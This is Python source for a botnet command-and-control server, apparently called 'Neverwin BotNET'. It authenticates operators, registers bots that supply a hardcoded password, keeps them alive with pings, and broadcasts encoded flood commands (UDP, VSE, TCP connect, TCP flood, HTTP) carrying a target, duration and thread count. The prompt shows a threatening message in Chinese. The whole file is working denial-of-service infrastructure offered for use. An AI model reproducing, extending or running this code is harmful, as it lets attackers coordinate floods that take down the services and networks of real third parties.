from concurrent.futures import process
from encodings import utf_8
from http import client
import socket
import sys
import threading
import time
from tracemalloc import start
from colorama import Fore, init
import pymysql
import sql
import base64
from crypto import * 

ansi_clear = '\033[2J\033[H'


bots={}


class CNC(object):
    def __init__(self,ip,port,max_listen):
        self.ip = ip
        self.port = port
        self.max_lis = max_listen

    
    def validate_ip(self,ip):
    
        parts = ip.split('.')
        return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
    def validate_port(self,port, rand=False):
        """ validate port number """
        if rand:
            return port.isdigit() and int(port) >= 0 and int(port) <= 65535
        else:
            return port.isdigit() and int(port) >= 1 and int(port) <= 65535

    def validate_time(self,time):
        """ validate attack duration """
        return time.isdigit() and int(time) >= 10 and int(time) <= 1300

    def validate_size(self,size):
        """ validate buffer size """
        return size.isdigit() and int(size) > 1 and int(size) <= 2000

 
    def broadcast(self,data):
    
        dead_bots = []
        for bot in bots.keys():
            try:
                self.send(bot,base_en(data), False, False)
            except:
                dead_bots.append(bot)
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        
    
    def send(self,socket, data, escape=True, reset=True):
        if reset:
            data += Fore.RESET
        if escape:
            data += '\r\n'
        socket.send(data.encode())

    def ping(self):
    
        while 1:
            dead_bots = []
            for bot in bots.keys():
                try:
                    bot.settimeout(10)
                    self.send(bot, base_en("PING"), False, False)
                    if base_de(bot.recv(1024).decode()) != 'PONG':
                        dead_bots.append(bot)
                except:
                    dead_bots.append(bot)
            
            for bot in dead_bots:
                bots.pop(bot)
                bot.close()
            time.sleep(5)


    def clean_all(self,client):
        for i in range(50):
            client.send("\r\n".encode())


    def client(self,clientsock):
        self.clean_all(clientsock)
        self.send(clientsock,"'  $$\   $$\                                                       $$\                 ")
        self.send(clientsock,"'  $$$\  $$ |                                                      \__|                ")
        self.send(clientsock,"'  $$$$\ $$ | $$$$$$\ $$\    $$\  $$$$$$\   $$$$$$\  $$\  $$\  $$\ $$\ $$$$$$$\        ")
        self.send(clientsock,"'  $$ $$\$$ |$$  __$$\\$$\  $$  |$$  __$$\ $$  __$$\ $$ | $$ | $$ |$$ |$$  __$$\       ")
        self.send(clientsock,"'  $$ \$$$$ |$$$$$$$$ |\$$\$$  / $$$$$$$$ |$$ |  \__|$$ | $$ | $$ |$$ |$$ |  $$ |      ")
        self.send(clientsock,"'  $$ |\$$$ |$$   ____| \$$$  /  $$   ____|$$ |      $$ | $$ | $$ |$$ |$$ |  $$ |      ")
        self.send(clientsock,"'  $$ | \$$ |\$$$$$$$\   \$  /   \$$$$$$$\ $$ |      \$$$$$\$$$$  |$$ |$$ |  $$ |      ")
        self.send(clientsock,"'  \__|  \__| \_______|   \_/     \_______|\__|       \_____\____/ \__|\__|  \__|      ")
        self.send(clientsock,"")
        self.send(clientsock,"")
        self.send(clientsock,"'  $$$$$$$\             $$\     $$\   $$\ $$$$$$$$\ $$$$$$$$\                          ")
        self.send(clientsock,"'  $$  __$$\            $$ |    $$$\  $$ |$$  _____|\__$$  __|                         ")
        self.send(clientsock,"'  $$ |  $$ | $$$$$$\ $$$$$$\   $$$$\ $$ |$$ |         $$ |                            ")
        self.send(clientsock,"'  $$$$$$$\ |$$  __$$\\_$$  _|  $$ $$\$$ |$$$$$\       $$ |                            ")
        self.send(clientsock,"'  $$  __$$\ $$ /  $$ | $$ |    $$ \$$$$ |$$  __|      $$ |                            ")        
        self.send(clientsock,"'  $$ |  $$ |$$ |  $$ | $$ |$$\ $$ |\$$$ |$$ |         $$ |                            ")
        self.send(clientsock,"'  $$$$$$$  |\$$$$$$  | \$$$$  |$$ | \$$ |$$$$$$$$\    $$ |                            ")        
        self.send(clientsock,"'  \_______/  \______/   \____/ \__|  \__|\________|   \__|                            ")
        while 1:
            try:
                EEWEW = Fore.RED + "三天之内殺了你@"
                clientsock.send(EEWEW.encode())
                
                data = clientsock.recv(1024).decode().strip()
                dd = data.split(" ")
                cmd = dd[0]
                print(cmd)
                if cmd == "help" or cmd == "HELP" or cmd == "?":
                    self.clean_all(clientsock)
                    
                    self.send(clientsock,Fore.YELLOW + "1. BANNER")
                    self.send(clientsock,Fore.YELLOW + "2. METHOD")
                    self.send(clientsock,Fore.BLUE + "")
                    self.send(clientsock,Fore.BLUE + "")

                
                if cmd =="BANNER" or cmd == "banner":
                    self.clean_all(clientsock)
                    self.send(clientsock,"'  $$\   $$\                                                       $$\                 ")
                    self.send(clientsock,"'  $$$\  $$ |                                                      \__|                ")
                    self.send(clientsock,"'  $$$$\ $$ | $$$$$$\ $$\    $$\  $$$$$$\   $$$$$$\  $$\  $$\  $$\ $$\ $$$$$$$\        ")
                    self.send(clientsock,"'  $$ $$\$$ |$$  __$$\\$$\  $$  |$$  __$$\ $$  __$$\ $$ | $$ | $$ |$$ |$$  __$$\       ")
                    self.send(clientsock,"'  $$ \$$$$ |$$$$$$$$ |\$$\$$  / $$$$$$$$ |$$ |  \__|$$ | $$ | $$ |$$ |$$ |  $$ |      ")
                    self.send(clientsock,"'  $$ |\$$$ |$$   ____| \$$$  /  $$   ____|$$ |      $$ | $$ | $$ |$$ |$$ |  $$ |      ")
                    self.send(clientsock,"'  $$ | \$$ |\$$$$$$$\   \$  /   \$$$$$$$\ $$ |      \$$$$$\$$$$  |$$ |$$ |  $$ |      ")
                    self.send(clientsock,"'  \__|  \__| \_______|   \_/     \_______|\__|       \_____\____/ \__|\__|  \__|      ")
                    self.send(clientsock,"")
                    self.send(clientsock,"")
                    self.send(clientsock,"'  $$$$$$$\             $$\     $$\   $$\ $$$$$$$$\ $$$$$$$$\                          ")
                    self.send(clientsock,"'  $$  __$$\            $$ |    $$$\  $$ |$$  _____|\__$$  __|                         ")
                    self.send(clientsock,"'  $$ |  $$ | $$$$$$\ $$$$$$\   $$$$\ $$ |$$ |         $$ |                            ")
                    self.send(clientsock,"'  $$$$$$$\ |$$  __$$\\_$$  _|  $$ $$\$$ |$$$$$\       $$ |                            ")
                    self.send(clientsock,"'  $$  __$$\ $$ /  $$ | $$ |    $$ \$$$$ |$$  __|      $$ |                            ")        
                    self.send(clientsock,"'  $$ |  $$ |$$ |  $$ | $$ |$$\ $$ |\$$$ |$$ |         $$ |                            ")
                    self.send(clientsock,"'  $$$$$$$  |\$$$$$$  | \$$$$  |$$ | \$$ |$$$$$$$$\    $$ |                            ")        
                    self.send(clientsock,"'  \_______/  \______/   \____/ \__|  \__|\________|   \__|                            ")


                if cmd == "method" or cmd == "METHODS" or cmd == "attack":
                    self.clean_all(clientsock)
                    self.send(clientsock,Fore.GREEN + "僵尸攻擊介紹：")
                    self.send(clientsock,Fore.GREEN + "L4:")
                    self.send(clientsock,Fore.GREEN + "$udp ip port maxlen time thread")
                    self.send(clientsock,Fore.GREEN + "$vse ip port time thread")
                    self.send(clientsock,Fore.GREEN + "$tcp_conn ip port time thread conn")
                    self.send(clientsock,Fore.GREEN + "$tcp_flood ip port time thread")
                    self.send(clientsock,Fore.GREEN + "")
                    
                    self.send(clientsock,Fore.GREEN + "L7:")
                    self.send(clientsock,Fore.GREEN + "$http domain time")
                    self.send(clientsock,Fore.GREEN + "")
                    self.send(clientsock,Fore.GREEN + "")
                    self.send(clientsock,Fore.GREEN + "")

                if cmd == "$udp" or cmd == "$UDP":
                    
                    if len(dd) ==6:
                        print("hi")
                        ip = dd[1]
                        port = dd[2]
                        secs = dd[4]
                        size = dd[3]
                        
                        thread = dd[5]
                        
                        self.send(clientsock, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                        self.broadcast(data)
                
                if cmd == "$vse" or cmd == "$VSE":
                    print(len(dd))
                    if len(dd) ==5:
                        
                        self.send(clientsock, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                        self.broadcast(data)
                
                if cmd == "$tcp_conn" or cmd == "$TCP_CONN":
                    if len(dd) ==6:
                        self.send(clientsock, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                        self.broadcast(data)
                if cmd == "$tcp_flood" or cmd == "$TCPFLOOD":
                    if len(dd) ==6:
                        self.send(clientsock, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                        self.broadcast(data)
                
                
                if cmd == "cls" or cmd == "clear" or cmd == "C":
                    for i in range(100):
                        self.send(client,"")
                
            except:
                pass        
    

    def title(self,client, username):
        print(client,username)
        while 1:
            try:
                self.send(client, f'\33]0; | Bots: {len(bots)} | Connected as: {username}\a', False)
                time.sleep(2)
            except:
                client.close()
    
    def handler(self,clientsocket,addr):
        
        while 1:
            clientsocket.send(b"username:\r\n")
            username = clientsocket.recv(1024).decode().strip()
            if not username:
                continue
            break
        print(username)
        password = ""
        while 1:
            clientsocket.send(b"password:\r\n")
            while not password.strip():
                password=clientsocket.recv(1024).decode().strip()

            break
        print(password)
        if password!= "FBI":
            if sql.check_password(username,password):

            
                time.sleep(1)
                threading.Thread(target=self.client,args=(clientsocket,)).start()
                threading.Thread(target=self.title,args=(clientsocket,username)).start()
            else:
                clientsocket.send(b"wrong password\r\n")
                time.sleep(2)
                clientsocket.close()
                        
        else:
            print('Bot Loaded from  [%s:%s]...' % addr)
            for x in bots.values():
                if x[0] == addr[0]:
                    print(x[0],addr[0])
                    clientsocket.send(b"fuckoff\r\n")
                    clientsocket.close()
                    return
            bots.update({clientsocket: addr})

    def startListen(self):
        init(convert=True)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((self.ip,self.port))    
        s.listen(self.max_lis)                                
        threading.Thread(target=self.ping).start()
        while 1:
            clientsocket,addr = s.accept()      
            
            t = threading.Thread(target=self.handler, args=(clientsocket, addr))
            t.start()

if __name__ == "__main__":
    start_L = CNC("0.0.0.0",11111,9999)
    start_L.startListen()
    
    

    



